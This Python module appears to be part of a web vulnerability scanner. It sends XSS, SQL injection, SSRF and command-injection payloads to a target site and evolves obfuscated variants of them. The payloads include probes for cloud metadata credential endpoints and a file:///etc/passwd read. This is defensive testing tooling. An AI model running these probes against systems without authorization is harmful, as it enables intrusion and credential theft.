"""Vulnerability-specific pipelines for deep class-targeted testing.

Each pipeline understands its vulnerability class deeply, using tuned payloads,
detection logic, and multi-step validation that generic fuzzing misses.
Based on AWE (Automated Vulnerability-specific Web Evaluation) pattern.
"""

from __future__ import annotations

import asyncio
import hashlib
import json
import logging
import re
import time
from dataclasses import dataclass
from statistics import mean
from urllib.parse import urljoin, urlparse, urlencode, parse_qs, urlunparse
from typing import Any

import httpx

from .payload_mutator import Gene, MutationResult, PayloadMutator

logger = logging.getLogger(__name__)


@dataclass
class VulnResult:
    url: str
    vuln_class: str
    finding: str | None = None
    severity: str = "info"
    evidence: str = ""
    confidence: float = 0.0
    cwe_id: str = ""


class XSSPipeline:
    """Deep XSS testing across all injection contexts."""

    MARKER_PREFIX = "assurix_xss"

    REFLECTED_PAYLOADS = [
        (f'<script>{MARKER_PREFIX}_1</script>', "script tag injection"),
        (f'<img src=x onerror={MARKER_PREFIX}_2>', "event handler injection"),
        (f'"><svg onload={MARKER_PREFIX}_3>', "attribute breakout"),
        (f"javascript:{MARKER_PREFIX}_4", "javascript URI"),
        (f'{MARKER_PREFIX}_5{{{{', "template injection probe"),
    ]

    DOM_PAYLOADS = [
        (f'<img src=x onerror=alert("{MARKER_PREFIX}_d1")>', "DOM sink: innerHTML/img"),
        (f'<a href="javascript:{MARKER_PREFIX}_d2">click</a>', "DOM sink: href"),
        (f'<iframe src="javascript:{MARKER_PREFIX}_d3">', "DOM sink: iframe src"),
    ]

    CONTEXTS = ["url_param", "form_post", "cookie"]

    def __init__(
        self,
        max_concurrent: int = 5,
        timeout: float = 10.0,
        mutator: PayloadMutator | None = None,
    ) -> None:
        self.semaphore = asyncio.Semaphore(max_concurrent)
        self.timeout = timeout
        self.mutator = mutator

    async def _request(self, client: httpx.AsyncClient, method: str, url: str, **kwargs) -> httpx.Response | None:
        async with self.semaphore:
            try:
                return await client.request(method, url, timeout=self.timeout, follow_redirects=True, **kwargs)
            except (httpx.HTTPError, Exception):
                return None

    async def scan(self, base_url: str, endpoints: list[str] | None = None) -> list[VulnResult]:
        results: list[VulnResult] = []
        async with httpx.AsyncClient(verify=False) as client:
            targets = endpoints or ["/", "/search", "/api/v1/search"]
            for endpoint in targets:
                url = urljoin(base_url, endpoint.lstrip("/"))
                for payload, desc in self.REFLECTED_PAYLOADS:
                    parsed = urlparse(url)
                    qs = parse_qs(parsed.query)
                    qs["q"] = [payload]
                    qs["search"] = [payload]
                    test_url = urlunparse((
                        parsed.scheme, parsed.netloc, parsed.path,
                        parsed.params, urlencode(qs, doseq=True), parsed.fragment,
                    ))
                    resp = await self._request(client, "GET", test_url)
                    if not resp or resp.status_code != 200:
                        continue
                    if self.MARKER_PREFIX in resp.text and "<script>" not in resp.text[:50]:
                        body_lower = resp.text.lower()
                        if payload.lower()[:20] in body_lower or self.MARKER_PREFIX in body_lower:
                            if any(ind in body_lower for ind in ('<div id="root">', '<div id="app">', '<div id="__next"')):
                                continue
                            results.append(VulnResult(
                                url=test_url, vuln_class="xss",
                                finding=f"Reflected XSS: {desc}",
                                severity="high",
                                evidence=f"Payload reflected in response at {test_url[:120]}",
                                confidence=0.85, cwe_id="CWE-79",
                            ))

            # Stored XSS: submit via POST, check persistence
            post_targets = [ep for ep in (endpoints or []) if any(kw in ep.lower() for kw in ("comment", "post", "submit", "message", "review"))]
            for endpoint in post_targets[:3]:
                url = urljoin(base_url, endpoint.lstrip("/"))
                marker = f"{self.MARKER_PREFIX}_stored_{hashlib.md5(url.encode()).hexdigest()[:6]}"
                payload = f'<img src=x onerror="{marker}">'
                resp = await self._request(client, "POST", url,
                    data={"content": payload, "comment": payload, "message": payload, "text": payload},
                    headers={"Content-Type": "application/x-www-form-urlencoded"})
                if resp and resp.status_code in (200, 201, 302):
                    for check_path in ["/", "/comments", "/posts", endpoint]:
                        check_url = urljoin(base_url, check_path.lstrip("/"))
                        check_resp = await self._request(client, "GET", check_url)
                        if check_resp and marker in check_resp.text:
                            results.append(VulnResult(
                                url=check_url, vuln_class="xss",
                                finding=f"Stored XSS: payload persisted and renders on {check_path}",
                                severity="critical",
                                evidence=f"Marker {marker} found on {check_url}",
                                confidence=0.9, cwe_id="CWE-79",
                            ))
                            break

            # Genetic mutation evolution: if XSS detected, evolve payloads
            if results and self.mutator is not None:
                try:
                    seed_payloads = [p for p, _ in self.REFLECTED_PAYLOADS] + [p for p, _ in self.DOM_PAYLOADS]
                    mutation_result = await self.mutator.evolve(
                        vuln_class="xss",
                        seed_payloads=seed_payloads,
                        generations=2,
                        population_size=8,
                        target_url=base_url,
                        http_client=client,
                    )
                    logger.info(
                        "XSS evolution: %d genes, best_fitness=%.3f, %d novel",
                        len(mutation_result.genes), mutation_result.best_fitness, mutation_result.novel_count,
                    )
                    # Test evolved payloads for additional findings
                    for gene in mutation_result.genes[:5]:
                        if gene.fitness_score > 0.3:
                            for endpoint in (endpoints or ["/", "/search"]):
                                url = urljoin(base_url, endpoint.lstrip("/"))
                                parsed = urlparse(url)
                                qs = parse_qs(parsed.query)
                                qs["q"] = [gene.payload]
                                test_url = urlunparse((
                                    parsed.scheme, parsed.netloc, parsed.path,
                                    parsed.params, urlencode(qs, doseq=True), parsed.fragment,
                                ))
                                resp = await self._request(client, "GET", test_url)
                                if resp and resp.status_code == 200:
                                    if gene.payload.lower()[:20] in resp.text.lower() or self.MARKER_PREFIX in resp.text.lower():
                                        results.append(VulnResult(
                                            url=test_url, vuln_class="xss",
                                            finding=f"Evolved XSS (gen={gene.generation}, fitness={gene.fitness_score:.2f}): {gene.obfuscation}",
                                            severity="high",
                                            evidence=f"Evolved payload reflected at {test_url[:120]}",
                                            confidence=min(0.7 + gene.fitness_score * 0.3, 0.95), cwe_id="CWE-79",
                                        ))
                except Exception as exc:
                    logger.warning("XSS mutation evolution failed: %s", exc)

        return results


class SQLiPipeline:
    """Deep SQL injection testing with error-based, boolean, time-based, and union detection."""

    ERROR_PAYLOADS = [
        ("'", "single quote error probe"),
        ("1'", "numeric quote error probe"),
        ("1 OR 1=1--", "boolean-based error probe"),
        ("1' OR '1'='1", "string boolean error probe"),
    ]

    SQL_ERROR_PATTERNS = [
        "sql syntax", "mysql", "postgresql", "sqlite", "ora-",
        "odbc", "sqlstate", "unclosed quotation", "unexpected end of sql",
        "supplied argument is not a valid", "mysql_fetch", "pg_query",
        "sql_error", "sqlmessage", "ora-01756", "sqlserver",
    ]

    BOOLEAN_TRUE_PAYLOADS = ["1 OR 1=1--", "1' OR '1'='1'--", "1) OR (1=1)--"]
    BOOLEAN_FALSE_PAYLOADS = ["1 OR 1=2--", "1' OR '1'='2'--", "1) OR (1=2)--"]

    UNION_PAYLOADS = [
        ("1 UNION SELECT NULL--", 1),
        ("1 UNION SELECT NULL,NULL--", 2),
        ("1 UNION SELECT NULL,NULL,NULL--", 3),
        ("1 UNION SELECT NULL,NULL,NULL,NULL--", 4),
        ("1 UNION SELECT NULL,NULL,NULL,NULL,NULL--", 5),
        ("1 UNION SELECT NULL,NULL,NULL,NULL,NULL,NULL--", 6),
        ("1 UNION SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL--", 7),
    ]

    TIME_PAYLOADS = {
        "mysql": ("1 AND SLEEP(3)--", "1 AND 1=1--"),
        "postgresql": ("1; SELECT pg_sleep(3)--", "1; SELECT 1--"),
        "mssql": ("1; WAITFOR DELAY '0:0:3'--", "1; WAITFOR DELAY '0:0:0'--"),
    }

    def __init__(
        self,
        max_concurrent: int = 3,
        timeout: float = 15.0,
        mutator: PayloadMutator | None = None,
    ) -> None:
        self.semaphore = asyncio.Semaphore(max_concurrent)
        self.timeout = timeout
        self.mutator = mutator

    async def _request(self, client: httpx.AsyncClient, method: str, url: str, **kwargs) -> httpx.Response | None:
        async with self.semaphore:
            try:
                return await client.request(method, url, timeout=self.timeout, follow_redirects=False, **kwargs)
            except (httpx.HTTPError, Exception):
                return None

    async def scan(self, base_url: str, endpoints: list[str] | None = None, params: list[str] | None = None) -> list[VulnResult]:
        results: list[VulnResult] = []
        test_params = params or ["id", "user_id", "page", "q", "search", "category"]
        targets = endpoints or ["/", "/search", "/api/v1/users", "/login"]

        async with httpx.AsyncClient(verify=False) as client:
            for endpoint in targets:
                url = urljoin(base_url, endpoint.lstrip("/"))
                baseline = await self._request(client, "GET", url)
                if not baseline:
                    continue
                baseline_body = baseline.text
                baseline_len = len(baseline_body)

                for param in test_params:
                    # Error-based detection
                    for payload, desc in self.ERROR_PAYLOADS:
                        test_url = f"{url}?{param}={payload}"
                        resp = await self._request(client, "GET", test_url)
                        if not resp:
                            continue
                        body_lower = resp.text.lower()
                        found_errors = [e for e in self.SQL_ERROR_PATTERNS if e in body_lower]
                        if found_errors:
                            results.append(VulnResult(
                                url=test_url, vuln_class="sqli",
                                finding=f"Error-based SQLi: {desc} triggered {found_errors}",
                                severity="high",
                                evidence=f"SQL errors: {found_errors} at {test_url[:120]}",
                                confidence=0.9, cwe_id="CWE-89",
                            ))
                            break

                    # Boolean-based blind detection
                    true_resp = await self._request(client, "GET", f"{url}?{param}={self.BOOLEAN_TRUE_PAYLOADS[0]}")
                    false_resp = await self._request(client, "GET", f"{url}?{param}={self.BOOLEAN_FALSE_PAYLOADS[0]}")
                    if true_resp and false_resp and true_resp.text != false_resp.text:
                        len_diff = abs(len(true_resp.text) - len(false_resp.text))
                        if len_diff > 50:
                            results.append(VulnResult(
                                url=url, vuln_class="sqli",
                                finding=f"Boolean-based blind SQLi: differential response on param '{param}'",
                                severity="high",
                                evidence=f"True: {len(true_resp.text)}B, False: {len(false_resp.text)}B, diff: {len_diff}B",
                                confidence=0.8, cwe_id="CWE-89",
                            ))

                    # Time-based blind detection
                    for engine, (delay_payload, control_payload) in self.TIME_PAYLOADS.items():
                        start = time.monotonic()
                        await self._request(client, "GET", f"{url}?{param}={delay_payload}")
                        delay_elapsed = time.monotonic() - start
                        start = time.monotonic()
                        await self._request(client, "GET", f"{url}?{param}={control_payload}")
                        control_elapsed = time.monotonic() - start
                        if delay_elapsed > 3.0 and (delay_elapsed - control_elapsed) > 2.5:
                            results.append(VulnResult(
                                url=url, vuln_class="sqli",
                                finding=f"Time-based blind SQLi ({engine}): param '{param}'",
                                severity="high",
                                evidence=f"Delay: {delay_elapsed:.1f}s, Control: {control_elapsed:.1f}s",
                                confidence=0.85, cwe_id="CWE-89",
                            ))
                            break

            # Genetic mutation evolution: if SQLi detected, evolve payloads
            if results and self.mutator is not None:
                try:
                    seed_payloads = [p for p, _ in self.ERROR_PAYLOADS] + self.BOOLEAN_TRUE_PAYLOADS
                    mutation_result = await self.mutator.evolve(
                        vuln_class="sqli",
                        seed_payloads=seed_payloads,
                        generations=2,
                        population_size=8,
                        target_url=base_url,
                        http_client=client,
                    )
                    logger.info(
                        "SQLi evolution: %d genes, best_fitness=%.3f, %d novel",
                        len(mutation_result.genes), mutation_result.best_fitness, mutation_result.novel_count,
                    )
                    for gene in mutation_result.genes[:5]:
                        if gene.fitness_score > 0.3:
                            for param in (params or ["id", "q"]):
                                test_url = f"{url}?{param}={gene.payload}"
                                resp = await self._request(client, "GET", test_url)
                                if resp:
                                    body_lower = resp.text.lower()
                                    found_errors = [e for e in self.SQL_ERROR_PATTERNS if e in body_lower]
                                    if found_errors:
                                        results.append(VulnResult(
                                            url=test_url, vuln_class="sqli",
                                            finding=f"Evolved SQLi (gen={gene.generation}, fitness={gene.fitness_score:.2f}): {gene.obfuscation}",
                                            severity="high",
                                            evidence=f"SQL errors: {found_errors} at {test_url[:120]}",
                                            confidence=min(0.7 + gene.fitness_score * 0.2, 0.95), cwe_id="CWE-89",
                                        ))
                except Exception as exc:
                    logger.warning("SQLi mutation evolution failed: %s", exc)

        return results


class SSRFPipeline:
    """Deep SSRF testing with cloud metadata, internal services, and protocol smuggling."""

    CLOUD_METADATA_URLS = [
        ("http://169.254.169.254/latest/meta-data/", "AWS EC2 metadata"),
        ("http://169.254.169.254/latest/meta-data/iam/security-credentials/", "AWS IAM credentials"),
        ("http://metadata.google.internal/computeMetadata/v1/", "GCP metadata"),
        ("http://100.100.100.200/latest/meta-data/", "Alibaba Cloud metadata"),
        ("http://169.254.169.254/metadata/instance?api-version=2021-02-01", "Azure metadata"),
    ]

    INTERNAL_SERVICES = [
        ("http://127.0.0.1:8080", "localhost HTTP"),
        ("http://127.0.0.1:3306", "MySQL"),
        ("http://127.0.0.1:6379", "Redis"),
        ("http://127.0.0.1:9200", "Elasticsearch"),
        ("http://127.0.0.1:5432", "PostgreSQL"),
        ("http://localhost:22", "SSH"),
    ]

    PROTOCOL_SMUGGLING = [
        ("gopher://127.0.0.1:6379/_PING", "gopher Redis"),
        ("file:///etc/passwd", "file protocol"),
        ("dict://127.0.0.1:6379/INFO", "dict protocol"),
    ]

    METADATA_MARKERS = [
        "ami-id", "instance-id", "instance-type", "local-ipv4",
        "iam", "security-credentials", "meta-data", "computeMetadata",
        "access-token", "projectId", "subscription-id",
    ]

    SSRF_PARAMS = ["url", "redirect", "next", "callback", "dest", "path", "file", "uri", "domain", "return_to"]

    def __init__(
        self,
        max_concurrent: int = 3,
        timeout: float = 10.0,
        mutator: PayloadMutator | None = None,
    ) -> None:
        self.semaphore = asyncio.Semaphore(max_concurrent)
        self.timeout = timeout
        self.mutator = mutator

    async def _request(self, client: httpx.AsyncClient, method: str, url: str, **kwargs) -> httpx.Response | None:
        async with self.semaphore:
            try:
                return await client.request(method, url, timeout=self.timeout, follow_redirects=False, **kwargs)
            except (httpx.HTTPError, Exception):
                return None

    async def scan(self, base_url: str) -> list[VulnResult]:
        results: list[VulnResult] = []
        async with httpx.AsyncClient(verify=False) as client:
            baseline = await self._request(client, "GET", base_url)
            baseline_body = baseline.text if baseline else ""
            baseline_len = len(baseline_body) if baseline else 0

            for param in self.SSRF_PARAMS:
                for meta_url, desc in self.CLOUD_METADATA_URLS:
                    test_url = f"{base_url}?{param}={meta_url}"
                    resp = await self._request(client, "GET", test_url)
                    if not resp:
                        continue
                    if resp.status_code == 200:
                        body_lower = resp.text.lower()
                        found_markers = [m for m in self.METADATA_MARKERS if m in body_lower]
                        if found_markers:
                            results.append(VulnResult(
                                url=test_url, vuln_class="ssrf",
                                finding=f"SSRF: Cloud metadata accessible via {param} ({desc})",
                                severity="critical",
                                evidence=f"Metadata markers found: {found_markers}",
                                confidence=0.95, cwe_id="CWE-918",
                            ))
                            continue
                        if baseline_len > 0 and abs(len(resp.text) - baseline_len) > baseline_len * 0.3:
                            results.append(VulnResult(
                                url=test_url, vuln_class="ssrf",
                                finding=f"SSRF: Response differs from baseline via {param} ({desc})",
                                severity="high",
                                evidence=f"Baseline: {baseline_len}B, SSRF: {len(resp.text)}B",
                                confidence=0.7, cwe_id="CWE-918",
                            ))

                for internal_url, desc in self.INTERNAL_SERVICES:
                    test_url = f"{base_url}?{param}={internal_url}"
                    resp = await self._request(client, "GET", test_url)
                    if not resp:
                        continue
                    if resp.status_code not in (0, 502, 503, 504):
                        if resp.status_code == 200 and resp.text and (not baseline_body or resp.text != baseline_body):
                            results.append(VulnResult(
                                url=test_url, vuln_class="ssrf",
                                finding=f"SSRF: Internal {desc} accessible via {param}",
                                severity="high",
                                evidence=f"Status: {resp.status_code}, Length: {len(resp.text)}B",
                                confidence=0.75, cwe_id="CWE-918",
                            ))

                for proto_url, desc in self.PROTOCOL_SMUGGLING:
                    test_url = f"{base_url}?{param}={proto_url}"
                    resp = await self._request(client, "GET", test_url)
                    if resp and resp.status_code == 200:
                        body_lower = resp.text.lower()
                        if "root:" in body_lower and ":/bin/" in body_lower:
                            results.append(VulnResult(
                                url=test_url, vuln_class="ssrf",
                                finding=f"SSRF: File read via protocol smuggling ({desc})",
                                severity="critical",
                                evidence=f"File contents leaked: {resp.text[:200]}",
                                confidence=0.95, cwe_id="CWE-918",
                            ))

            # Genetic mutation evolution: if SSRF detected, evolve payloads
            if results and self.mutator is not None:
                try:
                    seed_payloads = [url for url, _ in self.CLOUD_METADATA_URLS] + [url for url, _ in self.INTERNAL_SERVICES]
                    mutation_result = await self.mutator.evolve(
                        vuln_class="ssrf",
                        seed_payloads=seed_payloads,
                        generations=2,
                        population_size=8,
                        target_url=base_url,
                        http_client=client,
                    )
                    logger.info(
                        "SSRF evolution: %d genes, best_fitness=%.3f, %d novel",
                        len(mutation_result.genes), mutation_result.best_fitness, mutation_result.novel_count,
                    )
                    for gene in mutation_result.genes[:5]:
                        if gene.fitness_score > 0.3:
                            for param in self.SSRF_PARAMS[:3]:
                                test_url = f"{base_url}?{param}={gene.payload}"
                                resp = await self._request(client, "GET", test_url)
                                if resp and resp.status_code == 200:
                                    body_lower = resp.text.lower()
                                    found_markers = [m for m in self.METADATA_MARKERS if m in body_lower]
                                    if found_markers or (baseline_len > 0 and abs(len(resp.text) - baseline_len) > baseline_len * 0.3):
                                        results.append(VulnResult(
                                            url=test_url, vuln_class="ssrf",
                                            finding=f"Evolved SSRF (gen={gene.generation}, fitness={gene.fitness_score:.2f}): {gene.obfuscation}",
                                            severity="high",
                                            evidence=f"Evolved payload triggered response anomaly",
                                            confidence=min(0.7 + gene.fitness_score * 0.2, 0.95), cwe_id="CWE-918",
                                        ))
                                        break
                except Exception as exc:
                    logger.warning("SSRF mutation evolution failed: %s", exc)

        return results


class CommandInjectionPipeline:
    """OS command injection testing with echo-based and time-based detection."""

    ECHO_PAYLOADS = [
        ("; echo assurix_cmdi_1", "semicolon echo"),
        ("| echo assurix_cmdi_2", "pipe echo"),
        ("$(echo assurix_cmdi_3)", "command substitution"),
        ("`echo assurix_cmdi_4`", "backtick substitution"),
        ("& echo assurix_cmdi_5", "ampersand echo"),
        ("&& echo assurix_cmdi_6", "double ampersand echo"),
    ]

    MARKER = "assurix_cmdi"

    TIME_PAYLOADS = [
        ("; sleep 5", "semicolon sleep"),
        ("| sleep 5", "pipe sleep"),
        ("$(sleep 5)", "substitution sleep"),
    ]

    CMDI_PARAMS = ["cmd", "exec", "command", "ping", "host", "ip", "domain", "file", "path", "dir", "query", "search"]

    def __init__(
        self,
        max_concurrent: int = 3,
        timeout: float = 15.0,
        mutator: PayloadMutator | None = None,
    ) -> None:
        self.semaphore = asyncio.Semaphore(max_concurrent)
        self.timeout = timeout
        self.mutator = mutator

    async def _request(self, client: httpx.AsyncClient, method: str, url: str, **kwargs) -> httpx.Response | None:
        async with self.semaphore:
            try:
                return await client.request(method, url, timeout=self.timeout, follow_redirects=False, **kwargs)
            except (httpx.HTTPError, Exception):
                return None

    async def scan(self, base_url: str) -> list[VulnResult]:
        results: list[VulnResult] = []
        async with httpx.AsyncClient(verify=False) as client:
            baseline = await self._request(client, "GET", base_url)
            _baseline_body = baseline.text if baseline else ""

            for param in self.CMDI_PARAMS:
                for payload, desc in self.ECHO_PAYLOADS:
                    test_url = f"{base_url}?{param}={payload}"
                    resp = await self._request(client, "GET", test_url)
                    if resp and self.MARKER in resp.text:
                        results.append(VulnResult(
                            url=test_url, vuln_class="cmdi",
                            finding=f"Command Injection: echo marker reflected ({desc})",
                            severity="critical",
                            evidence=f"Marker '{self.MARKER}' found in response via param '{param}'",
                            confidence=0.95, cwe_id="CWE-78",
                        ))
                        break

                for payload, desc in self.TIME_PAYLOADS:
                    test_url = f"{base_url}?{param}={payload}"
                    start = time.monotonic()
                    await self._request(client, "GET", test_url)
                    elapsed = time.monotonic() - start
                    if elapsed > 4.5:
                        control_url = f"{base_url}?{param}=test"
                        ctrl_start = time.monotonic()
                        await self._request(client, "GET", control_url)
                        ctrl_elapsed = time.monotonic() - ctrl_start
                        if elapsed > ctrl_elapsed + 3.5:
                            results.append(VulnResult(
                                url=test_url, vuln_class="cmdi",
                                finding=f"Time-based Command Injection ({desc})",
                                severity="high",
                                evidence=f"Delay: {elapsed:.1f}s, Control: {ctrl_elapsed:.1f}s",
                                confidence=0.8, cwe_id="CWE-78",
                            ))
                            break

            # Genetic mutation evolution: if Cmdi detected, evolve payloads
            if results and self.mutator is not None:
                try:
                    seed_payloads = [p for p, _ in self.ECHO_PAYLOADS] + [p for p, _ in self.TIME_PAYLOADS]
                    mutation_result = await self.mutator.evolve(
                        vuln_class="cmdi",
                        seed_payloads=seed_payloads,
                        generations=2,
                        population_size=8,
                        target_url=base_url,
                        http_client=client,
                    )
                    logger.info(
                        "Cmdi evolution: %d genes, best_fitness=%.3f, %d novel",
                        len(mutation_result.genes), mutation_result.best_fitness, mutation_result.novel_count,
                    )
                    for gene in mutation_result.genes[:5]:
                        if gene.fitness_score > 0.3:
                            for param in self.CMDI_PARAMS[:3]:
                                test_url = f"{base_url}?{param}={gene.payload}"
                                resp = await self._request(client, "GET", test_url)
                                if resp and self.MARKER in resp.text:
                                    results.append(VulnResult(
                                        url=test_url, vuln_class="cmdi",
                                        finding=f"Evolved Cmdi (gen={gene.generation}, fitness={gene.fitness_score:.2f}): {gene.obfuscation}",
                                        severity="critical",
                                        evidence=f"Evolved payload executed via param '{param}'",
                                        confidence=min(0.7 + gene.fitness_score * 0.2, 0.95), cwe_id="CWE-78",
                                    ))
                                    break
                except Exception as exc:
                    logger.warning("Cmdi mutation evolution failed: %s", exc)

        return results